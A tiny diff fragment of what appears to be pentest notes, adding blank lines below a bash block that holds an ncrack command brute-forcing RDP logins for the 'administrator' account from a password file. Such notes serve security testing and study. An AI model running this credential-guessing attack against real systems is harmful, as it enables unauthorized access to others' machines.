@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:25:55.680618+00:00'
 ```bash
 ncrack --connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
 ```
+
+
